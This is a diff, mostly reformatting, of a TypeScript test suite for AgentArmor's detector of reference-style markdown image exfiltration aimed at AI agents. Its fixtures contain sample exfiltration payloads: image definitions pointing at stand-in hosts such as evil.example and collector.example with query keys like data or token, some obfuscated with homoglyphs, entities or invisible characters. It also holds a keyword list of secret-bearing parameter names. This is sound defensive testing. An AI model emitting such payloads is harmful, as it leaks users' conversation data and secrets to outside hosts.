@@ -34,14 +34,18 @@ describe('reference-style markdown image exfiltration (#219)', () => {
   it('reports every image that uses the definition, with its location', () => {
     const text = `![a][r] and ![b][r] and some words ![c][r]\n\n${DEF}`;
     const threats = detector.scan(text).threats;
-    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]', '![b][r]', '![c][r]']);
+    expect(
+      threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length)),
+    ).toEqual(['![a][r]', '![b][r]', '![c][r]']);
     expect(threats[0].category).toBe('behavioural-control');
     expect(threats[0].type).toBe('data-exfiltration');
   });
   it('reports images that touch each other as one finding, so a run of tiny images is one marker', () => {
     const text = `![a][r]![b][r] ![c][r]\n\n${DEF}`;
     const threats = detector.scan(text).threats;
-    expect(threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length))).toEqual(['![a][r]![b][r] ![c][r]']);
+    expect(
+      threats.map((t) => text.slice(t.location!.offset, t.location!.offset + t.location!.length)),
+    ).toEqual(['![a][r]![b][r] ![c][r]']);
     const dense = '![r]'.repeat(1000) + `\n\n${DEF}`;
     const result = AgentArmor.regexOnly().scanSync(dense);
     expect(result.sanitized.length).toBeLessThan(400);
@@ -82,24 +86,45 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     expect(flags(`![a\n\u00a0\nb][r]\n\n${DEF}`)).toBe(true); // a line of only NBSP is not blank
   });
   it('has no label length cap, and accepts list markers before a definition', () => {
-    expect(flags(`![x][${'l'.repeat(1500)}]\n\n[${'l'.repeat(1500)}]: https://c.example/p.png?data=1`)).toBe(true);
+    expect(
+      flags(`![x][${'l'.repeat(1500)}]\n\n[${'l'.repeat(1500)}]: https://c.example/p.png?data=1`),
+    ).toBe(true);
     expect(flags('![x][r]\n\n- [r]: https://c.example/p.png?data=1')).toBe(true);
     expect(flags('![x][r]\n\n1. [r]: https://c.example/p.png?data=1')).toBe(true);
     expect(flags('![x][r]\n\n- > [r]: https://c.example/p.png?data=1')).toBe(true);
   });
   it('decodes the URL before looking for the keyword', () => {
-    for (const url of ['https://c.example/p.png?%64ata=1', 'https://c.example/p.png?d&#97;ta=1', 'https://c.example/p&#63;data=1', 'https://c.example/p.png?\uff44\uff41\uff54\uff41=1', 'https://c.example/p.png?da\u200bta=1']) {
+    for (const url of [
+      'https://c.example/p.png?%64ata=1',
+      'https://c.example/p.png?d&#97;ta=1',
+      'https://c.example/p&#63;data=1',
+      'https://c.example/p.png?\uff44\uff41\uff54\uff41=1',
+      'https://c.example/p.png?da\u200bta=1',
+    ]) {
       expect(flags(`![x][r]\n\n[r]: ${url}`), url).toBe(true);
     }
     expect(flags('![x][r]\n\n[r]: <https://c.example/p.png?q=1 data=S>')).toBe(true); // a space inside <...>
     expect(flags('![x][r]\n\n[r]: https://c.example/p.png?v=%64')).toBe(false); // decodes to `d`, not a keyword
   });
   it('looks through look-alike letters, invisible characters and odd whitespace in the destination', () => {
-    for (const url of ['https://e.x/p.png?d\u0430ta=Q', 'https://e.x/p.png?t\u043eken=Q', 'https://e.x/p.png?k\u0435y=Q', 'https://e.x/p.png?da\u200eta=Q', 'https://e.x/p.png?da\u202ata=Q', 'https://e.x/p.png&quest;data=Q', 'https&colon;//e.x/p.png?data=Q', 'https:&sol;&sol;e.x/p.png?data=Q', 'https:\\/\\/e.x/p.png?data=Q', '<https://e.x/p.png?q=\\>data=Q>']) {
+    for (const url of [
+      'https://e.x/p.png?d\u0430ta=Q',
+      'https://e.x/p.png?t\u043eken=Q',
+      'https://e.x/p.png?k\u0435y=Q',
+      'https://e.x/p.png?da\u200eta=Q',
+      'https://e.x/p.png?da\u202ata=Q',
+      'https://e.x/p.png&quest;data=Q',
+      'https&colon;//e.x/p.png?data=Q',
+      'https:&sol;&sol;e.x/p.png?data=Q',
+      'https:\\/\\/e.x/p.png?data=Q',
+      '<https://e.x/p.png?q=\\>data=Q>',
+    ]) {
       expect(flags(`![x][r]\n\n[r]: ${url}`), url).toBe(true);
     }
     for (const gap of ['\u00a0', '\u2003', '\u3000', '\u202f', '\ufeff', '\n\u00a0']) {
-      expect(flags(`![x][r]\n\n[r]:${gap}https://e.x/p.png?data=Q`), JSON.stringify(gap)).toBe(true);
+      expect(flags(`![x][r]\n\n[r]:${gap}https://e.x/p.png?data=Q`), JSON.stringify(gap)).toBe(
+        true,
+      );
     }
   });
   it('does not read a link label as an image label (badges inside links stay clean)', () => {
@@ -164,12 +189,24 @@ describe('reference-style markdown image exfiltration (#219)', () => {
       ['an ordered list not starting at 1 inside a paragraph', `para \`\n2. \` ${IMG}\n\n${DEF}`],
       ['an ordered list marker with a parenthesis', `para \`\n7) \` ${IMG}\n\n${DEF}`],
       ['a dash indented four columns under a paragraph', `para \`\n    - \` ${IMG}\n\n${DEF}`],
-      ['a quote marker indented four columns under a paragraph', `para \`\n    > \` ${IMG}\n\n${DEF}`],
-      ['a numbered marker indented four columns under a paragraph', `para \`\n    1. \` ${IMG}\n\n${DEF}`],
-      ['a line that leaves a list item and closes its fence', `${DEF}\n\n- \`\`\`\n${IMG}\n\n\`\`\``],
+      [
+        'a quote marker indented four columns under a paragraph',
+        `para \`\n    > \` ${IMG}\n\n${DEF}`,
+      ],
+      [
+        'a numbered marker indented four columns under a paragraph',
+        `para \`\n    1. \` ${IMG}\n\n${DEF}`,
+      ],
+      [
+        'a line that leaves a list item and closes its fence',
+        `${DEF}\n\n- \`\`\`\n${IMG}\n\n\`\`\``,
+      ],
       ['a setext heading underline', `para \`\n===\n${IMG} \`\n\n${DEF}`],
       ['a setext heading with a dash underline', `para \`\n-\n${IMG} \`\n\n${DEF}`],
-      ['a four-space continuation inside a quote', '> x ![a][a\n>     > b]\n\n> [a > b]: https://e.x/p.png?data=Q'],
+      [
+        'a four-space continuation inside a quote',
+        '> x ![a][a\n>     > b]\n\n> [a > b]: https://e.x/p.png?data=Q',
+      ],
     ];
     it.each(shapes)('flags %s', (_name, text) => {
       expect(flags(text)).toBe(true);
@@ -192,12 +229,16 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     const armor = AgentArmor.regexOnly();
     const sanitized = (text: string): string => armor.scanSync(text).sanitized;
     it('removes the flagged definition along with the image, and keeps honest ones', () => {
-      const out = sanitized(`See ![chart][r] and [docs][ok].\n\n${DEF}\n[ok]: https://example.com/guide`);
+      const out = sanitized(
+        `See ![chart][r] and [docs][ok].\n\n${DEF}\n[ok]: https://example.com/guide`,
+      );
       expect(out).not.toContain('PRIVATE');
       expect(out).toContain('[ok]: https://example.com/guide');
     });
     it('removes every data-sending definition of the label, since a renderer may use any of them', () => {
-      const out = sanitized('![a][r]\n\n[r]: https://c.example/a.png?data=ONE\n[r]: https://c.example/b.png?token=TWO\n[k]: https://c.example/c?key=KEEP');
+      const out = sanitized(
+        '![a][r]\n\n[r]: https://c.example/a.png?data=ONE\n[r]: https://c.example/b.png?token=TWO\n[k]: https://c.example/c?key=KEEP',
+      );
       expect(out).not.toContain('ONE');
       expect(out).not.toContain('TWO');
       expect(out).toContain('KEEP'); // a definition no flagged image used is left alone
@@ -253,7 +294,9 @@ describe('reference-style markdown image exfiltration (#219)', () => {
       { role: 'document' as const, content: 'Summary.\n\n![chart][r]\n\n[r]:' },
       { role: 'document' as const, content: 'https://collector.example/p.png?data=PRIVATE' },
     ]);
-    expect(sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
+    expect(
+      sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration'),
+    ).toBe(true);
   });
 
   it('stays clean for honest references', () => {
@@ -261,8 +304,12 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     expect(flags('![x][r]\n\n[r]: https://example.com/changelog?lang=en')).toBe(false);
     expect(flags('![x][r]\n\n[r]: https://example.com/data/chart.png')).toBe(false); // keyword in the path, no query
     expect(flags('![x][missing]\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // no matching definition
-    expect(flags('See the [report][r] for details.\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // a link, not an image
-    expect(flags('![x](https://example.com/a.png)\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // inline image
+    expect(flags('See the [report][r] for details.\n\n[r]: https://c.example/p.png?data=1')).toBe(
+      false,
+    ); // a link, not an image
+    expect(flags('![x](https://example.com/a.png)\n\n[r]: https://c.example/p.png?data=1')).toBe(
+      false,
+    ); // inline image
   });
   it('flags a label if ANY definition of it sends data out, so a decoy cannot hide the real one', () => {
     const real = '[r]: https://evil.example/p.png?data=S';
@@ -279,7 +326,9 @@ describe('reference-style markdown image exfiltration (#219)', () => {
   });
   it('has no length caps to pad past: long path, long query, long alt text, long url', () => {
     expect(flags(`![x][r]\n\n[r]: https://c.example/${'a'.repeat(3000)}.png?data=1`)).toBe(true);
-    expect(flags(`![x][r]\n\n[r]: https://c.example/p.png?a=${'b'.repeat(3000)}&data=1`)).toBe(true);
+    expect(flags(`![x][r]\n\n[r]: https://c.example/p.png?a=${'b'.repeat(3000)}&data=1`)).toBe(
+      true,
+    );
     expect(flags(`![${'alt '.repeat(900)}][r]\n\n[r]: https://c.example/p.png?data=1`)).toBe(true);
   });
   it('a finding carries the definition as a related span, used by cross-turn scanning but not by sanitization', () => {
@@ -295,9 +344,13 @@ describe('reference-style markdown image exfiltration (#219)', () => {
       { role: 'document' as const, content: `Appendix.\n\n${DEF}` },
     ];
     const sync = armor.scanSession(turns);
-    expect(sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
+    expect(
+      sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration'),
+    ).toBe(true);
     const async = await armor.scanSessionAsync(turns);
-    expect(async.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
+    expect(
+      async.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration'),
+    ).toBe(true);
   });
 
   it('is wired into a scan and its image is replaced', () => {
@@ -305,7 +358,9 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     const text = `Hi.\n\n![chart][r]\n\n${DEF}`;
     const result = armor.scanSync(text);
     expect(result.clean).toBe(false);
-    expect(result.threats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
+    expect(result.threats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(
+      true,
+    );
     expect(result.sanitized).not.toContain('![chart][r]');
     expect(result.sanitized).toContain('[BLOCKED: exfiltration instruction removed by AgentArmor]');
   });
@@ -322,27 +377,79 @@ describe('reference-style markdown image exfiltration (#219)', () => {
  */
 function reference(content: string): Array<[number, number]> {
   const n = content.length;
-  const KEYWORDS = ['data', 'token', 'secret', 'key', 'context', 'conversation', 'history', 'session', 'password', 'credential', 'api_key', 'api-key', 'apikey', 'env'];
+  const KEYWORDS = [
+    'data',
+    'token',
+    'secret',
+    'key',
+    'context',
+    'conversation',
+    'history',
+    'session',
+    'password',
+    'credential',
+    'api_key',
+    'api-key',
+    'apikey',
+    'env',
+  ];
   const isBreakChar = (c: string | undefined) => c === '\n' || c === '\r';
   const PUNCT = /^[!-/:-@[-`{-~]$/;
   const GAPCHARS = /^[ \t\u00a0\u1680\u2000-\u200a\u202f\u205f\u3000\ufeff]$/;
   const isWs = (c: string) => /\s/.test(c);
-  const norm1 = (s: string, drop: boolean) => { let u = s.replace(/\0/g, '\ufffd'); if (drop) u = u.replace(/(?:\r\n|\r|\n)[ \t>]*/g, ' '); return u.trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase(); };
+  const norm1 = (s: string, drop: boolean) => {
+    let u = s.replace(/\0/g, '\ufffd');
+    if (drop) u = u.replace(/(?:\r\n|\r|\n)[ \t>]*/g, ' ');
+    return u.trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase();
+  };
   const keysOf = (s: string) => Array.from(new Set([norm1(s, false), norm1(s, true)]));
-  const afterBreak = (i: number) => (content[i] === '\r' && content[i + 1] === '\n' ? i + 2 : isBreakChar(content[i]) ? i + 1 : i);
+  const afterBreak = (i: number) =>
+    content[i] === '\r' && content[i + 1] === '\n' ? i + 2 : isBreakChar(content[i]) ? i + 1 : i;
   const blankLineAt = (i: number) => {
     let k = i;
     while (content[k] === ' ' || content[k] === '\t') k++;
     return k >= n || isBreakChar(content[k]);
   };
-  const NAMED: Record<string, string> = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", quest: '?', colon: ':', sol: '/', bsol: '\\', num: '#', equals: '=', period: '.', comma: ',', semi: ';', excl: '!', lowbar: '_', lpar: '(', rpar: ')', commat: '@', percnt: '%', plus: '+', Tab: '\t' };
+  const NAMED: Record<string, string> = {
+    amp: '&',
+    lt: '<',
+    gt: '>',
+    quot: '"',
+    apos: "'",
+    quest: '?',
+    colon: ':',
+    sol: '/',
+    bsol: '\\',
+    num: '#',
+    equals: '=',
+    period: '.',
+    comma: ',',
+    semi: ';',
+    excl: '!',
+    lowbar: '_',
+    lpar: '(',
+    rpar: ')',
+    commat: '@',
+    percnt: '%',
+    plus: '+',
+    Tab: '\t',
+  };
   const decode = (url: string): string => {
     let u = url;
-    u = u.replace(/&#(\d{1,7});/g, (m, d) => { const cp = Number(d); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; });
-    u = u.replace(/&#[xX]([0-9a-fA-F]{1,6});/g, (m, h) => { const cp = parseInt(h, 16); return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m; });
+    u = u.replace(/&#(\d{1,7});/g, (m, d) => {
+      const cp = Number(d);
+      return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m;
+    });
+    u = u.replace(/&#[xX]([0-9a-fA-F]{1,6});/g, (m, h) => {
+      const cp = parseInt(h, 16);
+      return cp > 0 && cp <= 0x10ffff ? String.fromCodePoint(cp) : m;
+    });
     u = u.replace(/&([a-zA-Z]{2,6});/g, (m, name) => NAMED[name] ?? m);
     u = u.replace(/\\([!-/:-@[-`{-~])/g, '$1');
-    u = u.replace(/%([2-7][0-9A-Fa-f])/g, (m, h) => { const c = String.fromCharCode(parseInt(h, 16)); return /[A-Za-z0-9_-]/.test(c) ? c : m; });
+    u = u.replace(/%([2-7][0-9A-Fa-f])/g, (m, h) => {
+      const c = String.fromCharCode(parseInt(h, 16));
+      return /[A-Za-z0-9_-]/.test(c) ? c : m;
+    });
     return normalizeForScan(u).normalized;
   };
   const flaggedUrl = (raw: string): boolean => {
@@ -356,7 +463,10 @@ function reference(content: string): Array<[number, number]> {
     let q = -1;
     for (let i = 0; i < u.length; i++) {
       if (stops(u[i])) return false;
-      if (u[i] === '?') { q = i; break; }
+      if (u[i] === '?') {
+        q = i;
+        break;
+      }
     }
     if (q < 0) return false;
     const query = u.slice(q + 1);
@@ -379,29 +489,61 @@ function reference(content: string): Array<[number, number]> {
       const c = content[i];
       if (c === ']') return items >= 1 || allowEmpty ? i : -1;
       if (c === '[') return -1;
-      if (c === '\\') { if (PUNCT.test(content[i + 1] ?? '')) { i += 2; } else { i++; } items++; continue; }
+      if (c === '\\') {
+        if (PUNCT.test(content[i + 1] ?? '')) {
+          i += 2;
+        } else {
+          i++;
+        }
+        items++;
+        continue;
+      }
       if (isBreakChar(c)) {
         const next = afterBreak(i);
         if (blankLineAt(next)) return -1;
-        i = next; items++; continue;
+        i = next;
+        items++;
+        continue;
       }
-      i++; items++;
+      i++;
+      items++;
     }
     return -1;
   };
 
   const flagged = new Set<string>();
   for (let i = 0; i <= n; i++) {
-    const lineStart = i === 0 || content[i - 1] === '\n' || content[i - 1] === '\r' || content[i - 1] === ' ' || content[i - 1] === ' ';
+    const lineStart =
+      i === 0 ||
+      content[i - 1] === '\n' ||
+      content[i - 1] === '\r' ||
+      content[i - 1] === ' ' ||
+      content[i - 1] === ' ';
     if (!lineStart) continue;
     let p = i;
     for (;;) {
       const c = content[p];
-      if (c === ' ' || c === '\t' || c === '>') { p++; continue; }
-      if ((c === '-' || c === '*' || c === '+') && (content[p + 1] === ' ' || content[p + 1] === '\t')) { p++; continue; }
+      if (c === ' ' || c === '\t' || c === '>') {
+        p++;
+        continue;
+      }
+      if (
+        (c === '-' || c === '*' || c === '+') &&
+        (content[p + 1] === ' ' || content[p + 1] === '\t')
+      ) {
+        p++;
+        continue;
+      }
       let d = p;
       while (d < n && d - p < 9 && content[d] >= '0' && content[d] <= '9') d++;
-      if (d > p && (content[d] === '.' || content[d] === ')') && (content[d + 1] === ' ' || content[d + 1] === '\t')) { p = d + 1; continue; }
+      if (
+        d > p &&
+        (content[d] === '.' || content[d] === ')') &&
+        (content[d + 1] === ' ' || content[d + 1] === '\t')
+      ) {
+        p = d + 1;
+        continue;
+      }
       break;
     }
     if (content[p] !== '[') continue;
@@ -409,12 +551,18 @@ function reference(content: string): Array<[number, number]> {
     if (e < 0 || content[e + 1] !== ':') continue;
     let d = e + 2;
     while (d < n && GAPCHARS.test(content[d])) d++;
-    if (isBreakChar(content[d])) { d = afterBreak(d); while (d < n && (GAPCHARS.test(content[d]) || content[d] === '>')) d++; }
+    if (isBreakChar(content[d])) {
+      d = afterBreak(d);
+      while (d < n && (GAPCHARS.test(content[d]) || content[d] === '>')) d++;
+    }
     let dest = '';
     if (content[d] === '<') {
       let g = d + 1;
       while (g < n && content[g] !== '>' && !isBreakChar(content[g])) {
-        if (content[g] === '\\') { if (isBreakChar(content[g + 1]) || g + 1 >= n) break; g += 2; } else g++;
+        if (content[g] === '\\') {
+          if (isBreakChar(content[g + 1]) || g + 1 >= n) break;
+          g += 2;
+        } else g++;
       }
       if (content[g] !== '>' || g - (d + 1) < 1) continue;
       dest = content.slice(d, g + 1);
@@ -431,12 +579,19 @@ function reference(content: string): Array<[number, number]> {
   const nestedEnd = (open: number): { end: number; inner: boolean } | undefined => {
     let depth = 0;
     let inner = false;
-    for (let i = open; i < n; ) {
+    for (let i = open; i < n;) {
       const c = content[i];
-      if (c === '\\') { i += PUNCT.test(content[i + 1] ?? '') ? 2 : 1; continue; }
-      if (c === '[') { depth++; if (depth > 1) inner = true; }
-      else if (c === ']') { depth--; if (depth === 0) return { end: i, inner }; }
-      else if (isBreakChar(c)) {
+      if (c === '\\') {
+        i += PUNCT.test(content[i + 1] ?? '') ? 2 : 1;
+        continue;
+      }
+      if (c === '[') {
+        depth++;
+        if (depth > 1) inner = true;
+      } else if (c === ']') {
+        depth--;
+        if (depth === 0) return { end: i, inner };
+      } else if (isBreakChar(c)) {
         const next = afterBreak(i);
         if (blankLineAt(next)) return undefined;
         i = next;
@@ -449,9 +604,12 @@ function reference(content: string): Array<[number, number]> {
   /** Reading B: the first unescaped `]` after the `[` at `open`, before a blank line. */
   const firstEnd = (open: number): { end: number; inner: boolean } | undefined => {
     let inner = false;
-    for (let i = open + 1; i < n; ) {
+    for (let i = open + 1; i < n;) {
       const c = content[i];
-      if (c === '\\') { i += PUNCT.test(content[i + 1] ?? '') ? 2 : 1; continue; }
+      if (c === '\\') {
+        i += PUNCT.test(content[i + 1] ?? '') ? 2 : 1;
+        continue;
+      }
       if (c === '[') inner = true;
       else if (c === ']') return { end: i, inner };
       else if (isBreakChar(c)) {
@@ -466,7 +624,11 @@ function reference(content: string): Array<[number, number]> {
   };
 
   const hits: Array<[number, number]> = []; // [start, end)
-  const readImage = (at: number, alt: { end: number; inner: boolean }, labelEndFn: (open: number, allowEmpty?: boolean) => number = labelEnd) => {
+  const readImage = (
+    at: number,
+    alt: { end: number; inner: boolean },
+    labelEndFn: (open: number, allowEmpty?: boolean) => number = labelEnd,
+  ) => {
     const afterAlt = alt.end + 1;
     let end = afterAlt;
     let label: string | undefined;
@@ -479,9 +641,11 @@ function reference(content: string): Array<[number, number]> {
         else if (!alt.inner) label = content.slice(at + 2, alt.end);
       }
     } else if (content[afterAlt] === '(') return;
-    if (label === undefined && end === afterAlt && !alt.inner) label = content.slice(at + 2, alt.end);
+    if (label === undefined && end === afterAlt && !alt.inner)
+      label = content.slice(at + 2, alt.end);
     // The raw reading has no block structure, so an image's label is matched without dropping quote markers (#227).
-    if (label !== undefined && [norm1(label, false)].some((key) => key !== '' && flagged.has(key))) hits.push([at, end]);
+    if (label !== undefined && [norm1(label, false)].some((key) => key !== '' && flagged.has(key)))
+      hits.push([at, end]);
   };
   for (let i = 0; i < n - 1; i++) {
     if (!(content[i] === '!' && content[i + 1] === '[')) continue;
@@ -494,19 +658,28 @@ function reference(content: string): Array<[number, number]> {
   let lastBang = -1;
   let closes = 0;
   let stack: number[] = [];
-  for (let i = 0; i < n; ) {
+  for (let i = 0; i < n;) {
     const c = content[i];
-    if (c === '\\') { i += PUNCT.test(content[i + 1] ?? '') ? 2 : 1; continue; }
+    if (c === '\\') {
+      i += PUNCT.test(content[i + 1] ?? '') ? 2 : 1;
+      continue;
+    }
     if (c === '[') {
       stack.push(i);
-      if (i > 0 && content[i - 1] === '!') { lastBang = i - 1; closes = 0; }
+      if (i > 0 && content[i - 1] === '!') {
+        lastBang = i - 1;
+        closes = 0;
+      }
     } else if (c === ']') {
       const opened = stack.pop();
       if (lastBang >= 0) {
         if (opened === undefined && closes > 0 && content[i + 1] === '[') {
           const le = labelEnd(i + 1);
           if (le >= 0) {
-            if ([norm1(content.slice(i + 2, le), false)].some((key) => key !== '' && flagged.has(key))) hits.push([lastBang, le + 1]);
+            if (
+              [norm1(content.slice(i + 2, le), false)].some((key) => key !== '' && flagged.has(key))
+            )
+              hits.push([lastBang, le + 1]);
           }
         }
         closes++;
@@ -514,7 +687,10 @@ function reference(content: string): Array<[number, number]> {
     }
     if (isBreakChar(c)) {
       const next = afterBreak(i);
-      if (blankLineAt(next)) { lastBang = -1; stack = []; }
+      if (blankLineAt(next)) {
+        lastBang = -1;
+        stack = [];
+      }
       i = next;
       continue;
     }
@@ -546,34 +722,158 @@ function rng(seed: number) {
 }
 
 describe('matches a slow reference on generated documents (#219)', () => {
-  const LABELS = ['r', 'R', 'my ref', 'My   Ref', ' r ', 'x', 'Stra\u00dfe', 'STRASSE', 'a\\]b', 'my\nref', 'my\r\nref', 'my\rref', 'a\n\nb', 'a\n    > b', 'a > b', 'my\n> ref', 'my\n\t> ref', 'my ref'];
-  const URLS = [
-    'https://c.example/p.png?data=X', 'http://c.example/?token=1', 'https://c.example/p.png?v=3', 'https://c.example/data/p.png',
-    '<https://c.example/p.png?secret=1>', 'https://c.example/?q=1&key=2', 'https://c.example/p.png?monkey=1', 'https://c.example/p.png?api_key=1',
-    'ftp://c.example/?data=1', 'https://c.example/p.png?', 'https://c.example/p.png?env', '<https://c.example/p.png?data=1',
-    'https://c.example/' + 'p'.repeat(300) + '.png?a=' + 'q'.repeat(300) + '&data=1', 'https://ok.example/a.png',
-    'https://c.example/p.png?d\u0430ta=1', 'https://c.example/p.png?da\u200eta=1', 'https://c.example/p.png&quest;data=1', 'https://c.example/p.png?q=\\>data=1', '<https://c.example/p.png?q=1\\>data=1>',
+  const LABELS = [
+    'r',
+    'R',
+    'my ref',
+    'My   Ref',
+    ' r ',
+    'x',
+    'Stra\u00dfe',
+    'STRASSE',
+    'a\\]b',
+    'my\nref',
+    'my\r\nref',
+    'my\rref',
+    'a\n\nb',
+    'a\n    > b',
+    'a > b',
+    'my\n> ref',
+    'my\n\t> ref',
+    'my ref',
   ];
-  const NOISE = ['\n- ```\n', '\n1. ```\n', '\n> ```\n', '\n> - ```\n', '\n***\n', '\n---\n', '\n- - -\n', '\n> ', '\n>> ', '\n    ', '\n\t> ', '\n    ```\n', '\n  ```\n', '\n~~~\n', '`', '``', '\n# ', '# Title [\n', '\n```\n', '\n~~~\n', '\n- [ x\n', '\n> \n', '\n1. ', '<http://h/[>', '<a@b.c>', 'text ', ' ', '\n', '\n\n', '\r\n', '\r', '\t', '(', ')', '[', ']', '[b]', '\\]', '\\[', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
+  const URLS = [
+    'https://c.example/p.png?data=X',
+    'http://c.example/?token=1',
+    'https://c.example/p.png?v=3',
+    'https://c.example/data/p.png',
+    '<https://c.example/p.png?secret=1>',
+    'https://c.example/?q=1&key=2',
+    'https://c.example/p.png?monkey=1',
+    'https://c.example/p.png?api_key=1',
+    'ftp://c.example/?data=1',
+    'https://c.example/p.png?',
+    'https://c.example/p.png?env',
+    '<https://c.example/p.png?data=1',
+    'https://c.example/' + 'p'.repeat(300) + '.png?a=' + 'q'.repeat(300) + '&data=1',
+    'https://ok.example/a.png',
+    'https://c.example/p.png?d\u0430ta=1',
+    'https://c.example/p.png?da\u200eta=1',
+    'https://c.example/p.png&quest;data=1',
+    'https://c.example/p.png?q=\\>data=1',
+    '<https://c.example/p.png?q=1\\>data=1>',
+  ];
+  const NOISE = [
+    '\n- ```\n',
+    '\n1. ```\n',
+    '\n> ```\n',
+    '\n> - ```\n',
+    '\n***\n',
+    '\n---\n',
+    '\n- - -\n',
+    '\n> ',
+    '\n>> ',
+    '\n    ',
+    '\n\t> ',
+    '\n    ```\n',
+    '\n  ```\n',
+    '\n~~~\n',
+    '`',
+    '``',
+    '\n# ',
+    '# Title [\n',
+    '\n```\n',
+    '\n~~~\n',
+    '\n- [ x\n',
+    '\n> \n',
+    '\n1. ',
+    '<http://h/[>',
+    '<a@b.c>',
+    'text ',
+    ' ',
+    '\n',
+    '\n\n',
+    '\r\n',
+    '\r',
+    '\t',
+    '(',
+    ')',
+    '[',
+    ']',
+    '[b]',
+    '\\]',
+    '\\[',
+    '!',
+    ':',
+    '<',
+    '>',
+    '?',
+    'a',
+    '\u2028',
+    'x'.repeat(40),
+  ];
   const label = (rand: () => number) => LABELS[Math.floor(rand() * LABELS.length)];
-  const pick = <T,>(rand: () => number, xs: T[]) => xs[Math.floor(rand() * xs.length)];
+  const pick = <T>(rand: () => number, xs: T[]) => xs[Math.floor(rand() * xs.length)];
   const piece = (rand: () => number): string => {
     const r = rand();
     if (r < 0.3) {
       const form = rand();
       const l = label(rand);
       if (form < 0.05) return `![${'alt '.repeat(300)}][${l}]`;
-      if (form < 0.12) return pick(rand, ['![a [b] c]', '![a\\]b]', '![first\nsecond]', '![first\r\nsecond]', '![a [b c]', '![[b]]', '![a `[` b]', '![a `]` b]', '![a <http://q.example/[> b]', '![a ] b]', '[![a][b]]', '![a][b] x [c]', '![a `x\n\ny` b]', '![a ``]`` b]', '![a <b@c.d> [ b]', '![a <https://h/]> b]']) + `[${l}]`;
+      if (form < 0.12)
+        return (
+          pick(rand, [
+            '![a [b] c]',
+            '![a\\]b]',
+            '![first\nsecond]',
+            '![first\r\nsecond]',
+            '![a [b c]',
+            '![[b]]',
+            '![a `[` b]',
+            '![a `]` b]',
+            '![a <http://q.example/[> b]',
+            '![a ] b]',
+            '[![a][b]]',
+            '![a][b] x [c]',
+            '![a `x\n\ny` b]',
+            '![a ``]`` b]',
+            '![a <b@c.d> [ b]',
+            '![a <https://h/]> b]',
+          ]) + `[${l}]`
+        );
       if (form < 0.16) return pick(rand, ['![a [b] c]', '![first\nsecond]', '![a\\]b]']);
       if (form < 0.4) return `![alt][${l}]`;
       if (form < 0.6) return `![${l}][]`;
       if (form < 0.8) return `![${l}]`;
       if (form < 0.85) return '![alt](https://c.example/a.png)';
-      if (form < 0.9) return pick(rand, ['![a `]` b][', '![', '![a][x `]` ', '![a][x <http://y/]>', '![a][r\0]', '> ![a][my\n> label]']) + (rand() < 0.5 ? `${l}]` : '');
+      if (form < 0.9)
+        return (
+          pick(rand, [
+            '![a `]` b][',
+            '![',
+            '![a][x `]` ',
+            '![a][x <http://y/]>',
+            '![a][r\0]',
+            '> ![a][my\n> label]',
+          ]) + (rand() < 0.5 ? `${l}]` : '')
+        );
       return `![alt][${l}`;
     }
     if (r < 0.62) {
-      const indent = pick(rand, ['', ' ', '   ', '    ', '\t', '> ', '>> ', '- ', '1. ', '10) ', '- > ', '* ']);
+      const indent = pick(rand, [
+        '',
+        ' ',
+        '   ',
+        '    ',
+        '\t',
+        '> ',
+        '>> ',
+        '- ',
+        '1. ',
+        '10) ',
+        '- > ',
+        '* ',
+      ]);
       const sep = pick(rand, [' ', '', '\t', '\n  ', '\n\n', '\u00a0', '\n\u00a0', '\u3000']);
       const title = rand() < 0.2 ? ' "title"' : '';
       return `\n${indent}[${label(rand)}]:${sep}${pick(rand, URLS)}${title}\n`;
@@ -590,16 +890,27 @@ describe('matches a slow reference on generated documents (#219)', () => {
       for (let m = Math.floor(rand() * 3); m > 0 && text.length > 0; m--) {
         const at = Math.floor(rand() * text.length);
         const op = rand();
-        text = op < 0.4 ? text.slice(0, at) + text.slice(at + 1) : op < 0.8 ? text.slice(0, at) + pick(rand, NOISE) + text.slice(at) : text.slice(0, at) + text.slice(at + 1 + Math.floor(rand() * 5));
+        text =
+          op < 0.4
+            ? text.slice(0, at) + text.slice(at + 1)
+            : op < 0.8
+              ? text.slice(0, at) + pick(rand, NOISE) + text.slice(at)
+              : text.slice(0, at) + text.slice(at + 1 + Math.floor(rand() * 5));
       }
-      const actual = detector.scan(text).threats.map((t) => [t.location!.offset, t.location!.length]);
+      const actual = detector
+        .scan(text)
+        .threats.map((t) => [t.location!.offset, t.location!.length]);
       const expected = reference(text);
       if (expected.length > 0) withMatch++;
       // The scan also reads the text the way a renderer does (#224, #225), so it may find more; it must
       // never find less than the independent raw reading.
-      const covered = expected.every(([start, length]) => actual.some(([at, len]) => at <= start && at + len >= start + length));
+      const covered = expected.every(([start, length]) =>
+        actual.some(([at, len]) => at <= start && at + len >= start + length),
+      );
       if (!covered) {
